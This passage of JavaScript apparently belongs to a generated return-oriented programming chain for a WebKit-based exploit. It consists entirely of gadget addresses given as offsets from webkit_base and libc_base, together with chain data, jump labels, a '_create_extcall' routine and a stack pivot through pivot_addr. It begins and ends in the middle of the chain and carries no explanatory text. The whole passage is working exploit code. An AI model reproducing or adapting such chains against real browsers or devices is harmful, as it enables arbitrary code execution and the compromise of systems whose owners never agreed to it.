ropchain+84440, //L473
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+84408, //L470
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+84392, //L471
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L471:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L470:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L472:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L473:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+84544, //L474
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+84576, //L476
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+84560, //L475
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L474:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L475:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L476:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+84664, //L477
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L477:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+84720, //L479
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L479:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+84792, //L481
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L481:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+84848, //L483
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L483:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+865136, //mov [rax], cl
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
//L485:
libc_base+793877, //pop rsi
ropchain+84936, //L486
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L486:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L488:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+85056, //L491
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+85040, //L489
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L489:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L491:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+85224, //L494
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+85240, //L495
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+85208, //L492
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+85192, //L493
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L493:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L492:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L494:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L495:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+85336, //L497
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+85320, //L496
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L496:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L497:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+85424, //L499
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
//L498:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L499:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+85480, //L500
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L500:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L502:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+793877, //pop rsi
ropchain+85560, //L503
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L503:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+811575, //pop rsp
ropchain+73952, //L202
//L235:
libc_base+793877, //pop rsi
ropchain+85656, //L505
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L505:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L507:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+85776, //L510
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+85760, //L508
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L508:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L510:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+85880, //L511
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+85912, //L513
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+85896, //L512
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L511:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L512:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L513:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+86008, //L514
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+86024, //L515
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L514:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L515:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+86136, //L516
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+86120, //L517
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L517:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L516:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+86224, //L519
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+86208, //L518
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L518:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L519:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+86320, //L520
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+86336, //L521
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L520:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L521:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+86448, //L522
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+86432, //L523
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L523:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L522:
db([0, 0]); // 0x0
//_create_extcall:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+86520, //L525
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L525:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+86584, //L527
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L527:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L528:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L530:
db([32, 0]); // 0x20
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+86752, //L533
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+86736, //L531
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L531:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L533:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+86840, //L534
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+86872, //L537
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L534:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L536:
db([4294967288, 4294967295]); // -0x8
set_gadget(libc_base+206806,); //pop rdi
//L537:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L539:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+87016, //L542
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+87000, //L540
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L540:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L542:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+87160, //L545
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+87128, //L543
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+87144, //L544
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L543:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L544:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L545:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+87232, //L546
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L546:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+87288, //L548
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L548:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+87368, //L552
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L552:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L550:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L551:
db([1, 0]); // 0x1
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+87472, //L553
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+87488, //L554
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L553:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L554:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+87576, //L555
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L555:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+87632, //L557
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L557:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+87736, //L559
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L559:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L561:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+87856, //L564
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+87840, //L562
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L562:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L564:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+88000, //L567
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+87968, //L565
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+87984, //L566
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L565:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L566:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L567:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+88072, //L568
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L568:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+88128, //L570
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L570:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+88208, //L574
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L574:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L572:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L573:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+88312, //L575
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+88328, //L576
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L575:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L576:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+88416, //L577
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L577:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+88472, //L579
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L579:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+88544, //L581
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L581:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+88600, //L583
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L583:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L585:
pivot_addr,
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+88736, //L586
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L586:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L588:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+88856, //L591
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+88840, //L589
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L589:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L591:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+89000, //L594
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+88968, //L592
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+88984, //L593
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L592:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L593:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L594:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+89072, //L595
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L595:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+89128, //L597
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L597:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+89208, //L601
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L601:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L599:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L600:
db([1, 0]); // 0x1
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+89312, //L602
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+89328, //L603
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L602:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L603:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+89416, //L604
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L604:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+89472, //L606
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L606:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+89544, //L608
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L608:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+89600, //L610
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L610:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+89688, //L612
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L612:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L614:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+89808, //L617
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+89792, //L615
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L615:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L617:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+89952, //L620
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+89920, //L618
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+89936, //L619
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L618:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L619:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L620:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+90024, //L621
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L621:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+90080, //L623
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L623:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+90160, //L627
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L627:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L625:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L626:
db([8, 0]); // 0x8
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+90264, //L628
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+90280, //L629
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L628:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L629:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+90368, //L630
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L630:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+90424, //L632
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L632:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+90528, //L634
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L634:
db([0, 0]); // 0x0
